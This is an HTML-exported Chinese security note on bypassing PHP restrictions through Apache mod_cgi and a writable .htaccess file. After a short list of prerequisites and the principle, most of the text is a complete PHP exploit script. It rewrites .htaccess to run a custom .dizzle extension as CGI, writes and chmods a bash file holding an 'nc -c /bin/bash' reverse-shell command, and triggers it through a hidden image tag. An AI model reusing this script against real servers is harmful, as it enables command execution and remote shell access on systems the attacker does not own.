<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h2 class="cs868C439D">
			<a name="利用-apachemodcgihtaccess-绕过"><span class="cs83F14626">利用</span><span class="csB2D98684"> Apache+mod_cgi+.htaccess </span><span class="cs83F14626">绕过</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">1. </span><span class="csE3F655E4">前提条件</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">启用</span><span class="cs8926E06">mod-cgi</span></li><li class="cs24C36B3"><span class="cs9C1B1871">允许</span><span class="cs8926E06">.htaccess</span><span class="cs9C1B1871">文件</span></li><li class="cs24C36B3"><span class="cs8926E06">.htaccess</span><span class="cs9C1B1871">可写</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">2. </span><span class="csE3F655E4">基本原理</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">apache</span><span class="cs9C1B1871">的</span><span class="cs8926E06">WEB</span><span class="cs9C1B1871">环境中，我们经常会使用</span><span class="cs8926E06">.htaccess</span><span class="cs9C1B1871">这个文件来确定某个目录下的</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">重写规则，特别是一些开源的</span><span class="cs8926E06">CMS</span><span class="cs9C1B1871">或者框架当中经常会用到，比如著名的开源论坛</span><span class="cs8926E06">discuz!</span><span class="cs9C1B1871">，就可以通过</span><span class="cs8926E06">.htaccess</span><span class="cs9C1B1871">文件实现</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">的静态化，大部分</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">框架，例如</span><span class="cs8926E06">ThinkPHP</span><span class="cs9C1B1871">和</span><span class="cs8926E06">Laravel</span><span class="cs9C1B1871">，在</span><span class="cs8926E06">apache</span><span class="cs9C1B1871">环境下会用</span><span class="cs8926E06">.htaccess</span><span class="cs9C1B1871">文件实现路由规则。但是如果</span><span class="cs8926E06">.htaccess</span><span class="cs9C1B1871">文件被攻击者修改的话，攻击者就可以利用</span><span class="cs8926E06">apache</span><span class="cs9C1B1871">的</span><span class="cs8926E06">mod_cgi</span><span class="cs9C1B1871">模块，直接绕过</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">的任何限制，来执行系统命令。</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">3. exp</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$cmd = &quot;nc -c&#39;/bin/bash&#39; 127.0.0.1 4444&quot;; //</span><span class="cs7FFD2630">反弹</span><span class="cs9FB05234">shell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$shellfile =&quot;#!/bin/bash\n&quot;; //</span><span class="cs7FFD2630">指定</span><span class="cs9FB05234">shell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$shellfile .=&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;; //</span><span class="cs7FFD2630">需要指定这个</span><span class="cs9FB05234">header</span><span class="cs7FFD2630">，否则会返回</span><span class="cs9FB05234">500</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$shellfile .=&quot;$cmd&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;echo &quot;$text: &quot; . ($condition ?$yes : $no) . &quot;&lt;br&gt;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(!isset($_GET[&#39;checked&#39;]))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;@file_put_contents(&#39;.htaccess&#39;,&quot;\nSetEnv HTACCESS on&quot;, FILE_APPEND);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;header(&#39;Location: &#39; . $_SERVER[&#39;PHP_SELF&#39;]. &#39;?checked=true&#39;); //</span><span class="cs7FFD2630">执行环境的检查</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;$modcgi = in_array(&#39;mod_cgi&#39;,apache_get_modules()); // </span><span class="cs7FFD2630">检测</span><span class="cs9FB05234">mod_cgi</span><span class="cs7FFD2630">是否开启</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;$writable = is_writable(&#39;.&#39;); //</span><span class="cs7FFD2630">检测当前目录是否可写</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;$htaccess = !empty($_SERVER[&#39;HTACCESS&#39;]);//</span><span class="cs7FFD2630">检测是否启用了</span><span class="cs9FB05234">.htaccess</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkEnabled(&quot;Mod-Cgienabled&quot;,$modcgi,&quot;Yes&quot;,&quot;No&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkEnabled(&quot;Iswritable&quot;,$writable,&quot;Yes&quot;,&quot;No&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkEnabled(&quot;htaccessworking&quot;,$htaccess,&quot;Yes&quot;,&quot;No&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;if(!($modcgi &amp;&amp; $writable&amp;&amp; $htaccess))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo &quot;Error. All of the above mustbe true for the script to work!&quot;; //</span><span class="cs7FFD2630">必须满足所有条件</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;{</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">checkEnabled(&quot;Backing</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">up.htaccess&quot;,copy(&quot;.htaccess&quot;,&quot;.htaccess.bak&quot;),&quot;Suceeded!Saved in</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">.htaccess.bak&quot;,&quot;Failed!&quot;); //</span><span class="cs7FFD2630">备份一下原有</span><span class="cs9FB05234">.htaccess</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">checkEnabled(&quot;Write</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">.htaccessfile&quot;,file_put_contents(&#39;.htaccess&#39;,&quot;Options</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">+ExecCGI\nAddHandlercgi-script</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">.dizzle&quot;),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//.dizzle</span><span class="cs7FFD2630">，我们的特定扩展名</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkEnabled(&quot;Write shellfile&quot;,file_put_contents(&#39;shell.dizzle&#39;,$shellfile),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//</span><span class="cs7FFD2630">写入文件</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkEnabled(&quot;Chmod777&quot;,chmod(&quot;shell.dizzle&quot;,0777),&quot;Succeeded!&quot;,&quot;Failed!&quot;);//</span><span class="cs7FFD2630">给权限</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo &quot;Executing the script now.Check your listener &lt;img src = &#39;shell.dizzle&#39; style =&#39;display:none;&#39;&gt;&quot;; //</span><span class="cs7FFD2630">调用</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p></body>
</html>
